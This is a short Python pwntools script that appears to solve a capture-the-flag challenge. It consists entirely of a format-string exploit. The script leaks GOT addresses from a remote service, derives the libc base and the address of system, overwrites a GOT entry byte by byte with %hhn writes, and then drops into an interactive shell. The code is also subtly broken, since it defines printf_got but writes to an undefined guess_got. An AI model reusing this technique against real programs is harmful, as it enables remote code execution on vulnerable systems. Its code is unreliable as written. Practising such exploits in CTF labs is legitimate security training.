from pwn import *

libc = ELF('./libc-2.23.so')

r = remote('chall.2019.redpwn.net', 4007)


r.sendline("%8$s"+p32(0x804a000))
info = r.recvn(28)
print hex(u32(info[0:4]))
print hex(u32(info[4:8]))
print hex(u32(info[8:12]))
print hex(u32(info[12:16]))
print hex(u32(info[16:20]))
print hex(u32(info[20:24]))
print hex(u32(info[24:28]))

print_addr = u32(info[16:20])
print "printf @ ", hex(print_addr)
libc_base = print_addr - libc.symbols['printf']
print "libc_base @ ", hex(libc_base)
system_addr = libc_base + libc.symbols['system']
print "system @ ", hex(system_addr)
read_addr = libc_base + libc.symbols['read']
print "read @ ", hex(read_addr)
fgets_addr = libc_base + libc.symbols['fgets']
print "fgets @ ", hex(fgets_addr)

def fmt(prev, value, idx):
    hhn = "%{}c%{}$hhn"
    if value > prev:
        return hhn.format(value-prev, idx)
    elif value == prev:
        return "%{}$hhn".format(idx)
    else:
        return hhn.format(0x100 + value - prev, idx)

printf_got = 0x0804a010
payload  = fmt(0, system_addr&0xff, 23)
payload += fmt(system_addr&0xff, (system_addr>>8)&0xff, 24)
payload += fmt((system_addr>>8)&0xff, (system_addr>>16)&0xff, 25)
payload += fmt((system_addr>>16)&0xff, (system_addr>>24)&0xff, 26)
payload = payload.ljust(0x40, 'a')
payload += p32(guess_got)
payload += p32(guess_got+1)
payload += p32(guess_got+2)
payload += p32(guess_got+3)

r.sendline(payload)

r.interactive()